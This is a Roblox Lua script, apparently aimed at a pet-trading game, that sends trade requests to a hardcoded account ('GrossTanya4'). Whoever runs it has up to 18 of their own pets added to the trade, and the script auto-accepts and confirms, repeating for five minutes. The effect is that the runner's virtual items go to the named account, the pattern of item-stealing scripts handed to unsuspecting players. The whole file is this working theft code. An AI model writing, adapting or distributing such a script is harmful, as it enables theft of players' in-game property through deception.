-- Define the target username
local Username = "GrossTanya4" -- Replace with the actual username

-- Import necessary modules
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")

-- Retrieve inventory data
local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local PlayerData = ClientData.get_data()[game.Players.LocalPlayer.Name]
local Inventory = PlayerData and PlayerData.inventory or {}

-- Validate username
if not game:GetService("Players"):FindFirstChild(Username) then
    error("Username not found in Players.")
end

-- Function to send a trade request
local function sendTradeRequest(targetPlayer)
    local args = { targetPlayer }
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
end

-- Function to handle pet trading
local function tradePets()
    if not Inventory.pets then
        print("No pets found in inventory.")
        return
    end
    
    local petCount = 0
    local petUids = {}
    
    -- Collect pet UIDs
    for petUid, petData in pairs(Inventory.pets) do
        table.insert(petUids, petUid)
    end

    -- Add pets to the trade
    for _, petUid in ipairs(petUids) do
        AddPetRemote:FireServer(petUid)
        petCount = petCount + 1
        if petCount == 18 then
            break -- Limit to 18 pets
        end
    end
end

-- Main loop with safety
local targetPlayer = game:GetService("Players")[Username]
local runTime = 0 -- Track elapsed time
local maxRunTime = 300 -- Stop after 300 seconds (5 minutes)

while task.wait(0.1) and runTime < maxRunTime do
    -- Send trade request
    sendTradeRequest(targetPlayer)
    
    -- Accept trade and confirm
    RouterClient.get("TradeAPI/AcceptNegotiation"):FireServer()
    RouterClient.get("TradeAPI/ConfirmTrade"):FireServer()
    
    -- Handle pet trading
    tradePets()
    
    runTime = runTime + 0.1
end

print("Trade loop ended.")
